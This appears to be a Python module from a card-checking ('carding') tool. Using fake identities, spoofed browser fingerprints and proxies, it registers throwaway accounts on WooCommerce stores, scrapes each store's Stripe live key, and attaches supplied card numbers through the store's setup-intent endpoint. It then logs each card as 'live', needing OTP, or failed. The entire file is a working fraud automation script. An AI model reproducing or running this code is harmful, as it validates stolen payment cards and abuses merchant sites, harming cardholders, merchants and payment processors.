import asyncio
import random
import re
from curl_cffi.requests import AsyncSession
from curl_cffi.requests import exceptions as ccx
from urllib.parse import urlparse
from utils.address_helper import get_address
from utils.helper import split_card_details
from utils.helper import safe_json
from utils.logs import logs


async def stripe_auth_checker(card: str, base_url: str, proxy: str, max_retries: int = 3):
    for attempt in range(1, max_retries + 1):
        ####################### CONFIGURATION #########################

        site = urlparse(base_url if base_url.startswith(
            ("http://", "https://")) else f"https://{base_url}").hostname
        random_num = random.randint(1, 9999999)
        impersonate = random.choice(["chrome", "edge", "safari", "firefox"])
        card_details, cc, mm, m, yyyy, yy, cvv = split_card_details(card)
        ####################### FAKE INFORMATION #########################
        site_country = "us"
        information_data = get_address(site_country)
        user = information_data["user"]
        first_name, last_name, email, phone, user_agent = (
            user.get("first_name", ""),
            user.get("last_name", ""),
            user.get("email", ""),
            user.get("phone", ""),
            user.get("user_agent", "")
        )
        proxy_body = {
            "http": proxy,
            "https": proxy,
        }
        try:
            # await asyncio.sleep(random.uniform(0.5, 0.7))
            async with AsyncSession(impersonate=impersonate, proxies=proxy_body, verify=False, timeout=30) as session:

                headers = {
                    "User-Agent": user_agent,
                    "Referer": f"https://{site}/my-account/"
                }
                username = f"{first_name}{random_num}"
                payload = {
                    'email': f"{first_name.lower()}.{last_name.lower()}.{random_num}@gmail.com",
                    "username": username
                }
                response = await session.post(f"https://{site}/my-account/", headers=headers, json=payload)
                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Account Registration Failed!", "Stripe")
                        return
                    continue
                response = await session.get(f"https://{site}/my-account/add-payment-method/", headers=headers)
                pattern_sk = r'"key"\s*:\s*"(pk_live[^"]*)"'
                matches = re.findall(pattern_sk, response.text)
                if matches:
                    pk = matches[0]
                else:
                    pk = None
                if pk is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Stripe Public Key Not Found", "Stripe")
                        return
                    continue
                headers.update(
                    {"Referer": f"https://{site}/my-account/add-payment-method/"})
                payload = {
                    "type": "card",
                    "card[number]": cc,
                    "card[cvc]": cvv,
                    "card[exp_year]": yy,
                    "card[exp_month]": mm,
                    "key": pk,
                    "_stripe_version": "2024-06-20"
                }
                response = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=payload)
                if response.status_code != 200:
                    if attempt == max_retries:
                        if "error" in response.json():
                            message = response.json()["error"].get(
                                "message", "No message provided on payment methods")
                            logs(
                                "error", site, card, f"Payment Method Error - {message} - {attempt}", "Stripe")
                            return
                    continue
                stripe_id = response.json().get("id")
                if not stripe_id:
                    if attempt == max_retries:
                        logs("error", site, card, "Stripe ID Not Found", "Stripe")
                        return
                    continue
                response = await session.get(f"https://{site}/my-account/add-payment-method/", headers=headers)
                match = re.search(
                    r',"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
                nonce = match.group(1) if match else None
                if nonce is None:
                    if attempt == max_retries:
                        logs("error", site, card, "Nonce Not Found", "Stripe")
                        return
                    continue
                payload = {
                    'action': 'create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': stripe_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }
                response = await session.post(f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=payload)
                resp_data = safe_json(response)
                if resp_data is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Response Data Not Found", "Stripe")
                        return
                    continue
                if resp_data.get("success") and resp_data.get("data", {}).get("status") == "succeeded":
                    logs("live", site, card, "CARD ADDED!", "Stripe")
                    return
                elif resp_data.get("success") and resp_data.get("data", {}).get("status") == "requires_action":
                    logs("otp", site, card,
                         f"ACTION REQUIRED - {attempt}", "Stripe")
                    return
                else:
                    error_message = resp_data["data"]["error"]["message"]
                    if "card's security code" in error_message.lower():
                        logs("live", site, card_details,
                             error_message, "Stripe")
                        return
                    logs("error", site, card,
                         f"{error_message} - {attempt}", "Stripe")
                    return
            return
        except (ccx.ProxyError, ccx.ConnectionError, ccx.ConnectTimeout, ccx.Timeout, asyncio.TimeoutError) as e:
            if attempt == max_retries:
                logs("error", site, card, type(e).__name__, "Stripe")
                return
            continue
        except Exception as e:
            if attempt == max_retries:
                logs("error", site, card, type(e).__name__, "Stripe")
                return
            continue
